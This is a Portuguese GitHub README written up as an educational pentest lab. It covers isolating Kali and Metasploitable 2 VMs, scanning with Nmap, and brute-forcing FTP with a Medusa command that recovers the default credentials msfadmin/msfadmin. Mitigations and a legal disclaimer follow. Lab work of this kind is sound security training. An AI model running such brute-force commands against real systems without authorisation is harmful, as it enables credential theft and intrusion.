# 🛡️ Pentest Lab: Brute Force Mastery

<div align="center">
  <!-- Substitua o link abaixo pela URL da imagem de banner que criar no Canva -->
  <img src="https://raw.githubusercontent.com/Israzuba0023/claude-howto/main/banner-pentest.png" alt="Banner do Projeto" width="800">

  <p align="center">
    <b>GUIA TÉCNICO DE EXPLORAÇÃO E SEGURANÇA DEFENSIVA</b>
  </p>

  <p align="center">
    <img src="https://img.shields.io/badge/Status-%231%20TRENDING-purple" alt="Trending">
    <img src="https://img.shields.io/badge/Language-Portugu%C3%AAs-blue" alt="Language">
    <img src="https://img.shields.io/badge/Project-DIO%20Challenge-orange" alt="DIO">
    <img src="https://img.shields.io/badge/Expert-DIO%20Campus%20Expert-red" alt="Expert">
    <img src="https://img.shields.io/badge/License-MIT-green" alt="MIT">
  </p>

  <p align="center">
    🌐 <b>Language / Língua:</b> <a href="#">English</a> | <a href="#">Português</a>
  </p>
</div>



# 🛡️ Lab de Pentest: Exploração de Força Bruta com Medusa

Este repositório contém a documentação completa de um laboratório de testes de intrusão (Pentest) realizado num ambiente isolado. O objetivo foi simular um ataque de força bruta (Brute Force) contra o protocolo FTP, utilizando ferramentas padrão da indústria para validar vulnerabilidades em credenciais de autenticação.

# 💻 1. Requisitos do Sistema (Hardware)

Para replicar este laboratório, foram utilizados:

    Sistema Host: Ubuntu Linux

    RAM: 4GB (Otimizada para rodar 2 máquinas virtuais simultaneamente)

    Virtualização: Oracle VM VirtualBox

# 🛠️ 2. Preparação do Ambiente (Passo a Passo)


Passo 1: Instalação do VirtualBox

No Ubuntu, o VirtualBox foi instalado via terminal para garantir a estabilidade:
Bash

sudo apt update
sudo apt install virtualbox

Passo 2: Download das Máquinas (ISOs)

    Atacante (Kali Linux): Download da imagem oficial (Pre-built Virtual Machines) em kali.org.

    Alvo (Metasploitable 2): Download da máquina intencionalmente vulnerável no SourceForge.

Passo 3: Configuração das Máquinas Virtuais

Para que as máquinas se comuniquem sem interferência da internet externa:

    No VirtualBox, vá em Configurações > Rede.

    Altere o Adaptador para Rede Interna (Internal Network).

    Defina o nome da rede como lab_pentest em ambas as VMs.

# 🔌 3. Configuração de Rede (Manual)

Como o ambiente é isolado, os IPs foram configurados manualmente via CLI para garantir que o "carteiro" (pacotes de rede) encontrasse o destino.

No Alvo (Metasploitable):
Bash

sudo ifconfig eth0 192.168.1.2 netmask 255.255.255.0 up

No Atacante (Kali Linux):
Bash

sudo ifconfig eth0 192.168.1.3 netmask 255.255.255.0 up
# Garantir que a rota de rede está ativa
sudo ip route add 192.168.1.0/24 dev eth0

    Teste de Conectividade: Verifique a conexão com ping 192.168.1.2.

# 🔍 4. Fase de Reconhecimento (Nmap)

Antes do ataque, é necessário mapear os serviços ativos no alvo.
Bash

nmap -sV 192.168.1.2

    Resultado: Identificamos que a porta 21 (FTP) está aberta e utiliza o serviço vsftpd 2.3.4.

# 🚀 5. Execução do Ataque (Medusa)

Utilizamos o Medusa, uma ferramenta de força bruta modular e rápida. Para tornar o ataque realista e demonstrar persistência, foi criada uma wordlist personalizada.

Comando utilizado:
Bash

medusa -h 192.168.1.2 -u msfadmin -P lista_realista.txt -M ftp -t 1 -v 6

    -h: IP do Alvo.

    -u: Usuário alvo (msfadmin).

    -P: Caminho para a Wordlist (lista de senhas).

    -M: Módulo do protocolo (FTP).

    -v 6: Modo verbose detalhado para monitorar cada tentativa.

# 🏁 6. Resultados e Prova de Conceito (PoC)

O ataque foi finalizado com sucesso ao encontrar a credencial correta:

    User: msfadmin

    Password: msfadmin

Validação do Acesso:
Após a quebra da senha, o acesso foi validado via cliente FTP padrão:
Bash

ftp 192.168.1.2
ls

O comando ls revelou os diretórios do servidor, confirmando o compromisso total do serviço.


# 🛡️ 7. Mitigação e Prevenção

Como Engenheiro Informático, as recomendações para evitar este tipo de exploração são:

    Fail2Ban: Bloquear IPs automaticamente após X tentativas falhas.

    Senhas Fortes: Implementar políticas que impeçam o uso de credenciais padrão.

    SFTP/SSH: Desativar o FTP em favor de protocolos criptografados que dificultam o sniffing e ataques de força bruta.

    Nota: Este projeto foi realizado para fins educativos no desafio da DIO. O uso destas técnicas sem autorização em sistemas de terceiros é ilegal.

# Autor

Israel Cassute (Zuba)
Engenharia Informática e Comunicações

DIO Campus Expert | Especialista em DevSecOps, MLOps & NetOps | DPO
